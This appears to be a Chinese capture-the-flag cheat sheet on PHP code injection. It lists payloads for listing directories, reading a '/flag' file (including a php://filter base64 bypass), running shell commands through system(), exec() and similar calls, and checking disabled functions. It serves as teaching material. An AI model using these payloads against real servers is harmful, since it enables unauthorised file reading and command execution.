Author: John Doe Date: September 6, 2026  12:00:00 Category: Web安全

一、找文件

函数 用法 效果
scandir() print_r(scandir('/')); 列出目录下所有文件和文件夹
glob() print_r(glob('/f*')); 通配符搜索文件路径
var_dump() var_dump(scandir('/')); 带类型地打印数组

当 print_r() 和 var_dump() 都被禁时，用 json_encode() 或 implode() 输出数组：

函数 用法 效果
json_encode() echo json_encode(scandir('/')); JSON 格式输出数组，清晰易读
implode() echo implode(' ', scandir('/')); 空格分隔拼接数组元素

二、读文件

函数 用法 效果
file_get_contents() echo file_get_contents('/flag'); 读整个文件成字符串
file() print_r(file('/flag')); 读文件成数组，每行一个元素
highlight_file() highlight_file('/flag'); 语法高亮显示文件源码
show_source() show_source('/flag'); 同 highlight_file
readfile() readfile('/flag'); 读文件直接输出
fopen()+fgets() $f=fopen('/flag','r'); while(!feof($f)) echo fgets($f); 逐行读取
fopen()+fread() echo fread(fopen('/flag','r'), filesize('/flag')); 指定长度读取
include() include('/flag'); 包含文件（PHP文件会执行，读源码需配合 php://filter）
php://filter echo file_get_contents('php://filter/read=convert.base64-encode/resource=/flag'); base64编码读取，绕过PHP解析

三、执行命令（如果没被禁用）

函数 用法 效果
system() system('ls /'); 执行命令，直接输出结果
exec() echo exec('ls /'); 执行命令，返回最后一行
shell_exec() echo shell_exec('ls /'); 执行命令，返回完整输出
passthru() passthru('ls /'); 执行命令，原始输出（适合二进制）
popen() while($l=fread(popen('ls /','r'),1024)) echo $l; 单向外壳

四、查看 PHP 配置

函数 用法 效果
phpinfo() phpinfo(); 查看所有 PHP 配置，包括禁用函数（disable_functions）
get_defined_functions() print_r(get_defined_functions()); 列出所有可用函数

七、常见问题

错误写法 错误原因 正确写法
echo file_get_contents('/flag*') file_get_contents 不支持 * 通配符 必须写完整路径
scandir('/var/www/html/flag.php/') flag.php 是文件不是目录，末尾不能加 / scandir('/var/www/html/')
echo file_get_contents('/var/www/html/flag.php') 少了分号 ; echo file_get_contents('/var/www/html/flag.php');

八、scandir() 怎么看目录结构

scandir() 返回一个数组，每个元素就是该目录下的一个条目（文件或文件夹名）。就是 Linux 里 ls -la 的效果：

通俗理解： scandir() 就像在终端里 ls 一个目录，file_get_contents() 就像 cat 一个文件。system() 被禁了没关系，PHP 自己的文件操作函数一样能读文件。
